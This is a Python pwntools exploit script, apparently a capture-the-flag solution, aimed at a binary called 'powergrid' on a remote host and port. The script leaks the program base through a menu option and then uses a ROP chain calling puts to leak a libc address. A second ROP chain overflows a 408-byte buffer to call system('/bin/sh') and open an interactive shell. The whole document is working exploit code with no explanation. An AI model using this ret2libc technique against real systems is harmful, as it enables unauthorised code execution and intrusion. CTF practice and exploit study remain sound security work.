#!/usr/bin/env python3

from pwn import *

exe = ELF("./powergrid_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.log_level = 'debug'
context.binary = exe

offset = 408


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.87.173.177", 21002)

    return r


def main():
    r = conn()

    r.recvuntil('>>')
    r.sendline(b'5')
    r.recvuntil(': ')
    exe.address = int(r.recvline().strip(b'\n').decode(), 16) - exe.sym.get_command
    log.info('base, %#x', exe.address)

    r.recvuntil('>>')
    rop = ROP(exe)
    rop.raw(b'A' * offset)
    rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
    rop.raw(exe.got.puts)
    rop.raw(exe.plt.puts)
    rop.raw(exe.sym.main)

    r.sendline(rop.chain())

    r.recvuntil('.\n')

    libc.address = u64(r.recvline().strip(b'\n').ljust(8, b'\x00')) - libc.sym.puts
    log.info('libc, %#x', libc.address)

    r.clean()

    rop2 = ROP(libc)
    rop2.raw(b'A' * offset)
    rop2.raw(rop2.find_gadget(['pop rdi', 'ret'])[0])
    rop2.raw(next(libc.search(b'/bin/sh\x00')))
    rop2.raw(rop2.find_gadget(['ret'])[0])
    rop2.raw(libc.sym.system)

    r.sendline(b'5')
    r.recvuntil(b'>>')
    r.send(rop2.chain())

    r.interactive()
    
if __name__ == "__main__":
    main()
